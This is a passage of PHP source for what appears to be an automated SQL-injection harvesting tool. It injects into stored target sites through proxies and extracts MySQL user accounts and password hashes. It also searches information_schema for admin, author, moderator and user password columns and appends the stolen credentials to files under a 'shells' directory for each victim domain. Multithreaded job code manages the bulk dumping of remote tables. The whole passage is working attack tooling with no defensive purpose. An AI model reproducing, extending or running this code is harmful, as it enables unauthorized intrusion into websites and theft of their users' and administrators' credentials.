
		$poles = $this->Post->query('SELECT * FROM `orders` WHERE `check_count` =0  ORDER by count DESC limit 300 ');
		$this->d($poles, 'poles');

		if (0 < count($poles)) {
		}
		 else {
			$this->stop();
			exit();
		}

		foreach ($poles as $pole ) {
			$id = $pole['orders']['id'];
			$bd = $pole['orders']['bd'];
			$table = $pole['orders']['table'];
			$column = $pole['orders']['column'];
			$count = $pole['orders']['count'];
			$this->workup();
			$this->count_new_one($id, $pole['orders']['post_id'], $bd, $table, $column, $count);
		}

		$this->stop();
		exit('fse');
	}

	public function count_new_one($id, $post_id, $bd, $table, $column, $count)
	{
		$this->d('count_new_one pusk');
		$pass = $this->cards;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $post_id . '  limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$order_id = $id;
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$count_table_new = $this->mysqlInj->mysqlGetCountInsert($bd, $table);

		if ($count_table_new == '') {
			$count_table_new = $count;
		}


		$razn = $count - $count_table_new;
		$this->d($count, '$count_table_OLD');
		$this->d($count_table_new, '$count_table_NEW');
		$this->d($razn);
		$date = date('Y-m-d h:i:s');

		if ($this->Filed->query('UPDATE  `orders` SET  `count_new` =  ' . $count_table_new . ',`count_new2` =' . $razn . ',`check_count` = 1,`date_new`= "' . $date . '" WHERE  `bd` = "' . $bd . '" AND `table`= "' . $table . '"')) {
			$this->d('update_new');
			$this->d('UPDATE  `orders` SET  `count_new` =  ' . $count_table_new . ',`check_count` = 1,`date_new`= "' . $date . '" WHERE  `bd` = "' . $bd . '" AND `table`= "' . $table . '"');
			return;
		}


		$this->d('UPDATE  `orders` SET  `count_new` =  ' . $count_table_new . ',`check_count` = 1,`date_new`= "' . $date . '" WHERE  `bd` = "' . $bd . '" AND `table`= "' . $table . '"');
	}

	public function getCountAdmin()
	{
		$this->timeStart = $this->start('getCountAdmin', 1);
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `table_admin_check` =0 AND `version` LIKE  \'%5.%\'  limit 5');

		if (0 < count($poles)) {
		}
		 else {
			$this->d('netuuuuuuu');
			$this->stop();
			exit();
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$this->d($pole, 'pole');
			flush();
			$this->workup();
			$this->search_admin($pole['posts']['id']);
			$this->search_admin_column($pole['posts']['id']);
			$this->findadmin($pole['posts']['domen']);
			$this->tableOrder = '';
		}

		$this->stop();
		exit('fse');
	}

	public function search_admin($idf)
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$data = $this->Session->read('inject');
		$squle['Post'] = $data['posts_one'];

		if ($squle['Post'] == '') {
			$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
			$squle = $squle[0];
			$squle['Post'] = $squle['posts'];
		}


		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['Post']['sleep'])) {
			$set = $squle['Post']['sleep'];
		}
		 else {
			$set = false;
		}

		$post_id = $squle['Post']['id'];
		$url2 = $squle['Post']['url'];
		$domen = $squle['Post']['domen'];
		$this->mysqlInj->inject($squle['Post']['header'] . '::' . trim($squle['Post']['gurl']), $data, $set);
		$count = $this->mysqlInj->mysqlGetCountInsert('mysql', 'user');
		$this->d($count, 'count user');

		if (0 < $count) {
			$file = 'admin.txt';
			$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
			$fp = fopen($ff, 'a+');
			$mysql_user = $this->mysqlInj->mysqlGetAllValue('mysql', 'user', array('Host', 'User', 'Password', 'File_priv'), $count, array(), '');
			$this->d($mysql_user, '$mysql_user');
			$date = date('Y-m-d h:i:s');

			foreach ($mysql_user as $mysql_user_one ) {
				$host = $mysql_user_one['Host'];
				$user = $mysql_user_one['User'];
				$m_pass = $mysql_user_one['Password'];
				$m_priv = $mysql_user_one['File_priv'];
				$url = $squle['Post']['url'];

				if (($user != '') && ($m_pass != '') && ($m_pass != NULL) && ($m_pass != 'null')) {
					$count = $this->Post->query('SELECT * FROM  `m_users` WHERE  `user` =\'' . $user . '\' AND `host`=\'' . $host . '\' AND m_pass=\'' . $m_pass . '\'');
					fwrite($fp, '`m_users` (`post_id`,`domen`,`host`,`user`,`m_pass`,`m_priv`) VALUES (' . $post_id . ',\'' . $domen . '\',\'' . $host . '\',\'' . $user . '\',\'' . $m_pass . '\',\'' . $m_priv . '\'' . "\r\n");
					fwrite($fp, '////////////////////////////////////' . "\r\n");

					if (count($count) == 0) {
						$this->Post->query('INSERT INTO `m_users` (`post_id`,`domen`,`host`,`user`,`m_pass`,`m_priv`) VALUES (' . $post_id . ',\'' . $domen . '\',\'' . $host . '\',\'' . $user . '\',\'' . $m_pass . '\',\'' . $m_priv . '\')');
					}

				}

			}
		}
		 else {
			$this->d('Таблицы mysql скорее всего нету');
		}

		$mega = array();
		$data111 = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('%adm%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))  AND `COLUMN_NAME` LIKE char(' . $this->charcher('%pass%') . ')  ');

		if (0 < count($data111)) {
			$this->d($data111, '$admin!!!!!!!!!');
			$mega[] = $data111;
		}


		$data222 = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('%author%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))  AND `COLUMN_NAME` LIKE char(' . $this->charcher('%pass%') . ') ');

		if (0 < count($data222)) {
			$this->d($data222, '$authors');
			$mega[] = $data222;
		}


		$data333 = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('%modera%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))  AND `COLUMN_NAME` LIKE char(' . $this->charcher('%pass%') . ') ');

		if (0 < count($data333)) {
			$this->d($data333, '$moderator');
			$mega[] = $data333;
		}


		$data444 = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('user%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))  AND `COLUMN_NAME` LIKE char(' . $this->charcher('%pass%') . ') AND `TABLE_SCHEMA` !=char(' . $this->charcher('mysql') . ')');

		if (0 < count($data444)) {
			$this->d($data444, 'users');
			$mega[] = $data444;
		}


		if (0 < count($mega)) {
			$str = '';
			mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
			$file = 'admin.txt';
			$ff = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/' . $file;
			$fp = fopen($ff, 'a+');
			$this->d($ff, 'ff');

			foreach ($mega as $mega_one ) {
				$i = 0;

				foreach ($mega_one as $one_data11 ) {
					$this->d($one_data11, ' $one_data11');
					$info = array();
					$data22 = $this->mysqlInj->mysqlGetFieldByTable($one_data11['TABLE_SCHEMA'], $one_data11['TABLE_NAME']);

					if (0 < count($data22)) {
						$this->d($data22, 'data22');

						foreach ($data22 as $num => $one_data2 ) {
							$one_data2 = trim($one_data2);

							if ($info['email'] == '') {
								if ($one_data2 == 'email') {
									$info['email'] = 'email';
								}
								 else if (preg_match('/mail/i', $one_data2)) {
									$info['email'] = $one_data2;
								}

							}


							if ($info['login'] == '') {
								if ($one_data2 == 'user') {
									$info['login'] = 'user';
								}
								 else if ($one_data2 == 'user_name') {
									$info['login'] = 'user_name';
								}
								 else if ($one_data2 == 'user_login') {
									$info['login'] = 'user_login';
								}
								 else if ($one_data2 == 'userName') {
									$info['login'] = 'userName';
								}
								 else if ($one_data2 == 'username') {
									$info['login'] = 'username';
								}
								 else if ($one_data2 == 'loginname') {
									$info['login'] = 'loginname';
								}
								 else if ($one_data2 == 'login') {
									$info['login'] = 'login';
								}
								 else if ($one_data2 == 'nickname') {
									$info['login'] = 'nickname';
								}
								 else if ($one_data2 == 'uname') {
									$info['login'] = 'uname';
								}
								 else {
									if (preg_match('/login/i', $one_data2)) {
										$info['login'] = $one_data2;
									}


									if ($info['login'] == '') {
										if (preg_match('/author/i', $one_data2)) {
											$info['login'] = $one_data2;
										}

									}


									if ($info['login'] == '') {
										if (preg_match('/modera/i', $one_data2)) {
											$info['login'] = $one_data2;
										}

									}


									if ($info['login'] == '') {
										if (preg_match('/root/i', $one_data2)) {
											$info['login'] = $one_data2;
										}

									}

								}
							}


							if ($info['pass'] == '') {
								if ($one_data2 == 'password') {
									$info['pass'] = 'password';
								}
								 else if ($one_data2 == 'userPassword') {
									$info['pass'] = 'userPassword';
								}
								 else if ($one_data2 == 'pass') {
									$info['pass'] = 'pass';
								}
								 else if ($one_data2 == 'user_pass') {
									$info['pass'] = 'user_pass';
								}
								 else if (preg_match('/pass/i', $one_data2)) {
									$info['pass'] = $one_data2;
								}


								$this->preg_pass = true;
							}


							if (preg_match('/salt/i', $one_data2)) {
								$info['salt'] = $one_data2;
							}

						}

						$this->d($info, '$info');

						if ((0 < count($info)) && ($info['pass'] != '')) {
							$count = $this->mysqlInj->mysqlGetCountInsert($one_data11['TABLE_SCHEMA'], $one_data11['TABLE_NAME']);

							if (0 < $count) {
								$data33 = $this->mysqlInj->mysqlGetAllValue($one_data11['TABLE_SCHEMA'], $one_data11['TABLE_NAME'], $info, 8, array(), '');
								$this->d($data33, '$data33');

								foreach ($data33 as $dd => $data33_one ) {
									$pp = $info['pass'];

									if (($data33_one[$pp] != 'null') && ($data33_one[$pp] != NULL)) {
										if ($this->preg_table == false) {
											fwrite($fp, 'TABLE_SCHEMA:' . $one_data11['TABLE_SCHEMA'] . "\r\n" . 'TABLE_NAME:' . $one_data11['TABLE_NAME'] . "\r\n");
											$st = implode(',', $info);
											fwrite($fp, 'COLUMNS:' . $st . "\r\n");
											$this->preg_table = true;
										}


										fwrite($fp, implode(',', $data33_one));
										fwrite($fp, "\r\n" . '//////////////////////////////' . "\r\n");
									}

								}

								$this->preg_table = false;
								fwrite($fp, "\r\n");
							}

						}


						$this->workup();
						++$i;
					}


					if ($i == 5) {
						break;
					}


					unset($info);
				}

				$this->workup();
			}

			fclose($fp);
		}

	}

	public function search_admin_column($idf)
	{
		$this->d('FindCountOrderOne - zapusk');
		$pass = array('adm');
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$this->d('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, '$squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$this->d($pass);
		$time = time();

		foreach ($pass as $pps ) {
			$new = time();
			$razn = $new - $time;
			$this->d($razn, 'razn');

			if (225 < $razn) {
				$this->d($razn . '-raz norders po vremeni > 25:' . $this->r);

				return 'vpizdu';
			}


			$time = time();
			$pss = trim($pps);
			$this->workup();
			$mysql_all = $this->mysqlInj->mysqlGetAllValue('information_schema', 'TABLES', array('TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `TABLE_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			$this->d($mysql_all, 'mysql ALLLLL');

			if (isset($mysql_all) && (0 < count($mysql_all))) {
				foreach ($mysql_all as $mysql ) {
					$this->workup();
					$new = time();
					$razn = $new - $time;
					$this->d($razn, 'razn2');

					if (225 < $razn) {
						$this->d($razn . '-raz norders po vremeni > 25:' . $this->r);

						return 'vpizdu';
					}


					$time = time();

					if (isset($mysql['TABLE_NAME']) && ($mysql['TABLE_NAME'] != NULL) && ($mysql['TABLE_NAME'] != 'null')) {
						$this->card_dubles[] = $mysql['TABLE_SCHEMA'] . '/' . $mysql['TABLE_NAME'];
						$bd = $mysql['TABLE_SCHEMA'];
						$table = $mysql['TABLE_NAME'];
						$this->tableOrder = $table;
						$mysql_columns = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME'), 0, array(), 'WHERE `TABLE_NAME`=\'' . $table . '\' AND `TABLE_SCHEMA`=\'' . $bd . '\'');
						$this->d($mysql_columns, '$mysql_columns');
						$k = 0;

						foreach ($mysql_columns as $mm ) {
							$gg[] = $mm['COLUMN_NAME'];
							++$k;
						}

						array_splice($gg, 4);
						$k = 0;
						$this->d($gg, '$gg');
						$mysql_data = $this->mysqlInj->mysqlGetAllValue($bd, $table, $gg, 0, array());
						$this->d($mysql_data, '$mysql_data');

						if (0 < count($mysql_data[0])) {
							$mm = implode(',', $mysql_data[0]);
							$this->d($mm, '$mm');
							$gg33 = implode(',', $gg);
							mkdir($_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen);
							$usp_tmp = $_SERVER['DOCUMENT_ROOT'] . '/app/webroot/shells/' . $domen . '/admin.txt';
							$ff2 = fopen($usp_tmp, 'a+');
							fwrite($ff2, $gg33 . ':' . $mm . "\n");
							fclose();
						}


						$gg = array();
					}

				}
			}
			 else {
				$this->d($pps, 'nuhya netu');
			}
		}
	}

	public function dumping_one($shag = 5)
	{
		if ($this->multidump_one == false) {
			echo 1111;
			$this->d('vikluchen');
			return false;
		}


		$this->shag = $shag;
		set_time_limit(0);
		$this->r = rand(1, 100);
		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$this->timeStart = $this->start('dumping_one', $settings['potok']);
		$this->d($settings, '$settings');
		$data = $this->Post->query('SELECT * FROM  `fileds_one` WHERE  `get` = \'1\' AND `multi`=1 AND `potok` !=1 AND `pri` =1 ORDER BY  `count` DESC limit 1');

		if (count($data) == 0) {
			$data = $this->Post->query('SELECT * FROM  `fileds_one` WHERE  `get` = \'1\' AND `multi`=1 AND `potok` !=1 ORDER BY  `count` DESC limit 1');

			if (count($data) == 0) {
				$this->stop();
				exit('stop ONE zapresheno, netu FILEDS_ONE ');
			}

		}


		$this->d($data, 'nachalo dumping_one');

		foreach ($data as $val ) {
			if ($val['fileds_one']['up'] == 1) {
				$this->up = true;
			}


			if ($val['fileds_one']['filed'] == '') {
				$this->stop();
				exit('stop fileds_one_filed==empty');
			}
			 else {
				$this->filed = $val['fileds_one']['filed'];
			}

			$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'1\',`multi` = 1 WHERE  `id` =' . $val['fileds_one']['id']);
			$this->Post->query('UPDATE  `starts` SET  `squle_id` = ' . $val['fileds_one']['id'] . ' WHERE  `time_start` =' . $this->timeStart);
			$sliv = $this->dumping_one_columns($val['fileds_one']['id']);
			$this->d($sliv, '$sliv  return dumping_one main');

			if ($sliv == 'vpizduone') {
				$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds_one`.`id` = ' . $val['fileds_one']['id']);
				$this->d('vpizduone bilo 5 popitok');
				$this->stop();
				exit();
			}


			if ($sliv !== 'vpizdu') {
				$this->d('ne vpizdu!!!!!  OK vse!!!');
				$multi = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` =2');
				$this->d('////////////////////// NE V PIZDU OK VSE get_one// ////////////////////////////////');

				if ($multi[0][0]['count(*)'] == $settings['potok_one']) {
					$this->d('multis_one zakonchilo id ' . $val['fileds_one']['id']);
					$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds_one`.`id` = ' . $val['fileds_one']['id']);
				}

			}
			 else {
				$this->d('//////////////////////////////////////vpizdu get_one//////////////////////////////////');

				if ($settings['potok_one'] == 1) {
					$this->Post->query('UPDATE  `fileds_one` SET  `potok` = 0  WHERE `fileds_one`.`id` = ' . $val['fileds_one']['id']);
					$this->stop();
					exit();
				}
				 else {
					$multi = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` =2 AND `dok` = 5');
					$this->d($multi, 'MULTI_one ' . 'SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` =2 AND `dok` = 5');
					$multi2 = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` !=0');
					$this->d($multi2, 'MULTI2_one SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` !=0');
					$multi3 = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` =2 AND `potok`=6');
					$this->d($multi3, ' MULTI3_one SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $val['fileds_one']['id'] . ' AND `get` =2 AND `potok`=6');
					$err = 3;

					if (($err <= $multi[0][0]['count(*)']) && ($settings['potok_one'] == 6)) {
						$this->d($val['fileds_one']['id'], '$multi[0][0][count(*)] >= $err');

						if ($this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id'])) {
							$this->d('UPDATE  `fileds_one` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id'], 'OK USPESHO');
						}
						 else {
							$this->d('UPDATE  `fileds_one` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id'], 'NO!!! NE USPESHO');
						}
					}


					if ((6 <= $multi2[0][0]['count(*)']) && (1 <= $multi[0][0]['count(*)'])) {
						$this->d('kol-vo potokov - ' . $multi2[0][0]['count(*)'] . ' i odna oshibka to zakrivaem dumping');
						$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'3\', `multi` = 0 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id']);
						$this->stop();
						exit('okay 1');
					}


					if (($multi2[0][0]['count(*)'] == 6) && ($multi3[0][0]['count(*)'] == 1)) {
						$this->d('$multi2[0][0][count(*)] ==6 AND $multi3[0][0][count(*)]==1');
						$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id']);
						$this->stop();
						exit('okay 2');
					}


					if (($multi2[0][0]['count(*)'] == 5) && ($multi[0][0]['count(*)'] == $settings['potok_one'])) {
						$this->d('$multi2[0][0][count(*)] ==5 AND $multi[0][0][count(*)]==1');
						$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'2\', `multi` = 2 WHERE  `fileds_one`.`id` =' . $val['fileds_one']['id']);
						$this->stop();
						exit('okay 4');
					}

				}
			}
		}

		$this->stop();
		exit('okay end !');
	}

	public function dumping_one_columns($id = 2)
	{
		$settings['potok_one'] = $this->potok_one;
		$settings['dump_one_good'] = $this->dump_one_good;
		$settings['dump_one'] = $this->dump_one;
		$settings['check_url'] = $this->check_url;
		$settings['potok'] = $this->potok;
		$settings['pass'] = $this->pass;
		$this->d('dumping_one_columns GROUP');
		$mail2 = $this->Post->query('SELECT * FROM  `fileds_one` WHERE `id` = ' . $id . ' limit 1');
		$mail['Filed'] = $mail2[0]['fileds_one'];
		$filed_id = $mail['Filed']['id'];
		$this->d($mail, 'mail');
		$squle2 = $this->Post->query('SELECT * FROM  `posts_one` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
		$this->d('SELECT * FROM  `posts_one` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
		$squle[0]['posts'] = $squle2[0]['posts_one'];

		if (!(isset($squle[0]['posts']['id']))) {
			$squle2 = $this->Post->query('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
			$this->d('SELECT * FROM  `posts` WHERE `id` = ' . $mail['Filed']['post_id'] . ' limit 0,1');
			$squle[0]['posts'] = $squle2[0]['posts'];
		}


		if (!(isset($squle[0]['posts']['id']))) {
			$data = $this->Post->query('UPDATE  `fileds_one` SET  `get` =  \'3\', multi = 0 WHERE  `id` =' . $mail['Filed']['id']);
			$this->d('netu d post_one');

			if (!($this->Post->query('UPDATE  `multis_one` SET  `prich`=\'function group no find post_one\'  WHERE   `filed_id` =' . $filed_id))) {
				mysql_error();
			}


			$this->d('vpizdu');
			return 'vpizdu';
		}


		$this->d($squle, '$squle POSTS');

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET dump dumping_one_columns');
		}
		 else {
			$set = false;
		}

		$bd = explode(':', $mail['Filed']['ipbase']);
		$count = $mail['Filed']['count'];
		$ff = intval($mail['Filed']['lastlimit']);

		if ($ff == '') {
			$ff = 0;
		}


		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();
		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['url'], $squle[0], $set);
		$ppp = $settings['potok_one'];

		if (!($this->Post->query('UPDATE  `fileds_one` SET  `potok` =  ' . $ppp . ' WHERE  `id` =' . $mail['Filed']['id']))) {
			echo mysql_error();
			exit();
		}


		$multi = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$tmpCount = $count - $mail['Filed']['lastlimit'];
		$oneCount = $tmpCount / $settings['potok_one'];
		$oneCount = round($oneCount);
		$zapr = round($oneCount / $this->shag);

		if ($zapr == 0) {
			$zapr = 1;
		}


		$this->d($count, '$count');
		$this->d($mail['Filed']['lastlimit'], '$mail["Filed"]["lastlimit"]');
		$this->d($multi, 'SELECT count(*) FROM  `multis_one` WHERE `filed_id` = ' . $mail['Filed']['id'] . ' AND `get` !=0');
		$this->d($zapr, 'zapr pervuy KOLICHESTVO ITERACYU PRIVERNO !!!!');
		$this->d($oneCount . ' oneCount perviy S KAKOGO BUDEM NACHINAT $count-$mail["Filed"]["lastlimit"]/$settings["potok_one"]');
		flush();

		if ($multi[0][0]['count(*)'] == 0) {
			$this->d('//////////////////////////////////pervyi potok////////////////////////////////////////');
			$potok = 1;

			if ($ff == 0) {
				$start = 0;
			}
			 else {
				$start = $ff;
			}

			$numPotok = $this->Post->query('SELECT count(*) FROM  `multis_one` WHERE `potok` = ' . $potok . ' AND `filed_id`=' . $filed_id);
			$this->d($numPotok, '$numPotok vsego potokov');

			if ($numPotok[0][0]['count(*)'] == 0) {
				$f = 'dumping_one_columns';
				$this->d('shag 1');
				$post_id = $squle[0]['posts']['id'];
				$squle[0]['posts']['url'] = str_replace('http://', '', $squle[0]['posts']['url']);
				$squle[0]['posts']['url'] = 'http://' . $squle[0]['posts']['url'];
				$h2 = parse_url($squle[0]['posts']['url']);
				$domen = $h2['host'];
				$date = time();
				$tmpCount1 = $oneCount + $start;
				$this->d($post_id, '$post_id');
				$this->d($domen, 'domen');
				$this->d($tmpCount1, '$tmpCount1');
				$this->d($date, '$date');
				$this->d($f, '$f');
				$this->d($potok, '$potok');
				$this->d($start, '$start');
				$this->d($filed_id, '$filed_id');
				$this->d('shag 2');
				$this->d('INSERT INTO `multis_one` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',' . $this->pid . ')');

				if ($this->Post->query('INSERT INTO `multis_one` (`filed_id`,`lastlimit`,`count`,`get`,`potok`,`isp`,`post_id`,`domen`,`date`,`pid`) VALUES(' . $filed_id . ',' . $start . ',' . $tmpCount1 . ',1,' . $potok . ',\'' . $f . '\',' . $post_id . ',\'' . $domen . '\',\'' . $date . '\',\'' . $this->pid . '\')')) {
				}


				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $potok . ' WHERE  `time_start` =' . $this->timeStart);
				$this->d('shag 3');
			}

		}
		 else {
			$this->d('ETO UJE NE PERVUY POTOK');
			$zav11 = $this->Post->query('SELECT * FROM  `multis_one` WHERE `get` = 3 AND `dok` = 5 AND `filed_id` =' . $filed_id . ' limit 1');
			$zav0[0]['multis'] = $zav11[0]['multis_one'];
			$this->d($zav0, '$zav0 multislivcontacat pass  `get` = 3 AND `dok` = 5');

			if ($zav0[0]['multis']['get'] == 3) {
				$this->d('////////////////////////////////////////POPPITKI ISCHERPANU get = 3 AND dok = 5 V PIZDU//////////////////////////////////////////');

				if ($this->Post->query('UPDATE  `multis_one` SET  `get` =  2, `dok` = 5 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id)) {
					$this->Post->query('UPDATE  `multis_one` SET  `prich` =  `prich`+\'function group bilo 5 popitok\' WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
					$this->d('YES update `multis_one` SET  `get` =  2,`dok` = 5');
				}


				$this->d('UPDATE  `multis_one` SET  `get` =  2 WHERE  `potok` = ' . $zav0[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->d($zav0, 'zav0 ETO ESLI BILI UJE 5 POPITKI `GET` 3 AND `DOK`=5 ////// Stavim status 2');

				if (($multi[0][0]['count(*)'] == 1) && ($settings['potok_one'] == 1)) {
					return 'vpizduone';
				}


				return 'vpizdu';
			}


			$zav22 = $this->Post->query('SELECT * FROM  `multis_one` WHERE `get`=3 AND `dok` < 5 AND `filed_id`=' . $filed_id . ' limit 1');
			$zav[0]['multis'] = $zav22[0]['multis_one'];
			$this->d($zav, ' $zav `get`=3 AND `dok` < 5');

			if ($zav[0]['multis']['get'] == 3) {
				$this->d('////////////////////PEREZAPUSK//////////////////////////////////////////');
				$this->d($zav, 'zav get=3 AND dok < 5 ////// dlya perezapuska');
				$dok = $zav[0]['multis']['dok'] + 1;
				$this->Post->query('UPDATE  `multis_one` SET  `get` =  1,`dok` =' . $dok . ' WHERE  `potok` = ' . $zav[0]['multis']['potok'] . ' AND `filed_id`=' . $filed_id);
				$this->Post->query('UPDATE  `starts` SET  `potok` = ' . $zav[0]['multis']['potok'] . ' WHERE  `time_start` =' . $this->timeStart);
				$start = $zav[0]['multis']['lastlimit'];
				$oneCount = $zav[0]['multis']['count'];
				$potok = $zav[0]['multis']['potok'];
				$oneCount = $oneCount - $start;
				$zapr = round($oneCount / $this->shag);
				$this->d($zapr, '$zapr get 3 KOLICHESTO ITERACYU POSLE PERESAPUSKA');
			}
			 else if (($multi[0][0]['count(*)'] == 1) && ($settings['potok_one'] == 1)) {
				$potok = 1;
			}
			 else {
				$this->d('////////////////////DOBAVLYAEM NOVYU POTOK//////////////////////////////////////////');
				$allPotok = $multi[0][0]['count(*)'];
				$next11 = $this->Post->query('SELECT * FROM  `multis_one` WHERE `potok` = ' . $allPotok . ' AND `filed_id`=' . $filed_id);
				$next[0]['multis'] = $next11[0]['multis_one'];
				$this->d($allPotok, '$allPotok dumping_one');
				$this->d($next, '$next - infa o poslednem potoke slivWithPassConcastMulti');
				$start = $next[0]['multis']['count'];
				$oneCount = $next[0]['multis']['count'] + $oneCount;
				$oneCount = $oneCount - 20;
				$kk = $count - $oneCount;
				$zapr = round($kk / $this->shag);
				$this->d($zapr, 'zarp новый поток');
				$this->d($start, '$start');
				$this->d($count, '$count');
				$this->d($oneCount, '$oneCount');
				$potok = $next[0]['multis']['potok'] + 1;

				if ($count < $oneCount) {
					$this->d($oneCount . ' > ' . $count . ' oneCount > count  1');
					$oneCount = $count - 100;
					$start = $start - 100;
					$zapr = round($oneCount / $this->shag);

					if (6 <= $potok) {
						$potok = 6;
						$this->d('potok > 6 oneCount > count');

						if ($this->Post->query('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id)) {
							$this->d('UPDATE  `multis_one` SET  `get` = 3 WHERE  `potok`=' . $allPotok . ' AND `filed_id`=' . $filed_id);
							$this->d('YES update potok > 6 oneCount > count slivpass contact prosto');
						}


						return 'vpizdu';
					}

				}


				if ($oneCount < $count) {
